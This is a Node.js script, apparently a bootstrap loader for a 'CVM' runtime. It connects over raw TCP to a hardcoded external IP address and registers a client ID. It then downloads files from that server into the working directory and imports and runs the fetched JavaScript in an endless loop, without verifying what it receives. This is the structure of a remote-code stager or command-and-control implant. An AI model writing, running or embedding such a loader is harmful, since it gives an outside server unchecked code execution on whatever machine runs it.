const net = require("net");
const fs = require("fs");
const crypto = require("crypto");
const { pathToFileURL } = require("url");

const HOST = "124.221.146.23";
const PORT = 9000;

const REGISTER = 1;
const DOWNLOAD_FILE = 3;
const STREAM_CHILDREN = 5;

const CVM = globalThis.CVM = {
    ID: null,
    BASE: null,
    PTR: null,
    IMP: null,
};

function sha256(data) {
    return crypto.createHash("sha256").update(data).digest();
}

function str_sha(s) {
    return sha256(Buffer.from(s));
}

function hex(data) {
    return Buffer.from(data).toString("hex");
}

function read_i32(p) {
    return p.buf.readInt32LE(p.off);
}

function block_size(p) {
    let n = read_i32(p);
    return n < 0 ? -n : n;
}

function block_data(p) {
    return p.buf.subarray(
        p.off + 4,
        p.off + 4 + block_size(p)
    );
}

function socket() {
    return new Promise(resolve => {
        let s = net.createConnection(PORT, HOST, () => {
            resolve(s);
        });
    });
}

function recv_all(s, n) {
    return new Promise(resolve => {
        let arr = [];
        let len = 0;

        function ondata(data) {
            arr.push(data);
            len += data.length;

            if (len >= n) {
                s.off("data", ondata);

                let buf = Buffer.concat(arr, len);
                let out = buf.subarray(0, n);
                let rest = buf.subarray(n);

                if (rest.length)
                    s.unshift(rest);

                resolve(out);
            }
        }

        s.on("data", ondata);
    });
}

async function register_id() {
    let s = await socket();

    s.write(Buffer.from([REGISTER]));

    await recv_all(s, 1);
    let id = await recv_all(s, 32);

    s.end();

    return id;
}

async function get_first_child(parent) {
    let s = await socket();

    s.write(Buffer.from([STREAM_CHILDREN]));
    s.write(CVM.ID);
    s.write(parent);

    await recv_all(s, 1);
    let child = await recv_all(s, 32);

    s.end();

    return child;
}

async function download_file(hash, ext = ".js") {
    let s = await socket();

    s.write(Buffer.from([DOWNLOAD_FILE]));
    s.write(hash);

    await recv_all(s, 1);

    let size_buf = await recv_all(s, 4);
    let size = size_buf.readUInt32BE(0);

    let data = await recv_all(s, size);

    s.end();

    let path = hex(hash) + ext;
    fs.writeFileSync(path, data);

    return {
        path,
        data
    };
}

async function load_js(hash) {
    let file = await download_file(hash, ".js");

    let url =
        pathToFileURL(process.cwd() + "/" + file.path).href +
        "?t=" + Date.now();

    return import(url);
}

Object.assign(CVM, {
    sha256,
    str_sha,
    hex,

    read_i32,
    block_size,
    block_data,

    socket,
    recv_all,

    register_id,
    get_first_child,
    download_file,
    load_js,
});

async function boot() {
    CVM.ID = await register_id();

    let start_key = str_sha("Cstart");

    let first_block_hash = await get_first_child(start_key);

    let first_block = await download_file(first_block_hash, ".bin");

    CVM.BASE = {
        buf: first_block.data,
        off: 0
    };

    CVM.PTR = CVM.BASE;

    let first_js_hash = sha256(block_data(CVM.PTR));

    let mod = await load_js(first_js_hash);

    CVM.IMP = mod.run;
}

async function main_loop() {
    while (1) {
        await CVM.IMP();
        await new Promise(resolve => setImmediate(resolve));
    }
}

(async function main() {
    await boot();
    await main_loop();
})();